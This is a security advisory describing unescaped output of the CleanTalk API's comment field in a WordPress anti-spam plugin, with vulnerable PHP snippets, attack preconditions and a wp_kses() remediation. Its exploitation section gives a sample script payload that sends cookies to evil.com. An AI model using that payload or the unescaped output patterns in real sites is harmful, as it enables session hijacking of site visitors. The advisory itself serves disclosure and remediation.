# CTSP-002: Reflected XSS via Unsanitized API Response in wp_die()

## Severity: Medium (CVSS ~4.7)

## Summary

Multiple code paths in CleanTalk's form validation output `$ct_result->comment` (a string returned from CleanTalk's external cloud API) directly into HTML without escaping. While most branches in the same functions correctly apply `wp_kses()`, specific integration paths (VFB Forms, Caldera Forms, Mailster) skip sanitization entirely. This is a trust-boundary violation -- if CleanTalk's API is compromised or MitM'd, arbitrary JavaScript can be injected into the victim site's error pages.

## Affected Code

### cleantalk-public-validate.php

**VFB Forms path (lines 296-303) -- wp_die() with raw HTML:**
```php
} elseif ( isset($_POST['vfb-submit']) && defined('VFB_VERSION') ) {
    wp_die(
        "<h1>" . __(
            'Spam protection by CleanTalk',
            'cleantalk-spam-protect'
        ) . "</h1><h2>" . $ct_result->comment . "</h2>",
        '',
        array('response' => 403, "back_link" => true, "text_direction" => 'ltr')
    );
```

**Caldera Forms path (line 306) -- raw print:**
```php
} elseif ( isset($_POST['action']) && $_POST['action'] == 'cf_process_ajax_submit' ) {
    print "<h3 style='color: red;'><red>" . $ct_result->comment . "</red></h3>";
    die();
```

**Mailster path (lines 310-315) -- raw HTML in JSON:**
```php
$return = array(
    'success' => false,
    'html'    => '<p>' . $ct_result->comment . '</p>',
);
print json_encode($return);
```

### cleantalk-ajax.php

**Multiple paths echoing $ct_result->comment as raw HTML:**
- Line 600: `print $ct_result->comment;` (request_appointment / send_message)
- Line 605: `print '<div id="login_error">' . $ct_result->comment . '</div>';` (zn_do_login)
- Line 617: `print $ct_result->comment;` (woocommerce_checkout)
- Line 711: `"<h1 style='font-size: 25px;...'>" . $ct_result->comment . "</h1>"` (amoForms)
- Line 743: same pattern (ConvertPlug)
- Line 959: `sprintf('<div>...%s</div>', $ct_result->comment)` (WPML subscribe)

### Compare with correctly sanitized paths in the same file:

```php
// Lines 264-274 -- CORRECT: uses wp_kses()
echo wp_kses($ct_result->comment, array(
    'a' => array('href' => true, 'title' => true),
    'br' => array(),
    'p'  => array()
));
```

## Exploitation Scenario

This is NOT a standard reflected XSS. The attack requires:

1. **MitM of the HTTPS connection** between the WordPress server and `moderate.cleantalk.org`, OR
2. **Compromise of CleanTalk's API servers** (supply-chain attack), OR
3. **DNS hijack** of `moderate.cleantalk.org` to an attacker-controlled server

If any of these conditions are met, the attacker's server returns:
```json
{"comment": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
```

This renders unescaped in the victim's browser when they submit a form on the affected WordPress site.

## Impact

- Cookie theft, session hijacking for any user submitting forms on the site
- Affects 200K+ WordPress installations
- Supply-chain risk from trusting third-party API output as safe HTML

## Preconditions

- Target site must use one of the affected form plugins (VFB, Caldera, Mailster, WooCommerce, amoForms, ConvertPlug, WPML)
- Attacker must be able to influence the CleanTalk API response

## Remediation

Apply `wp_kses()` or `esc_html()` to `$ct_result->comment` in all output contexts, consistent with how other branches in the same function already handle it.
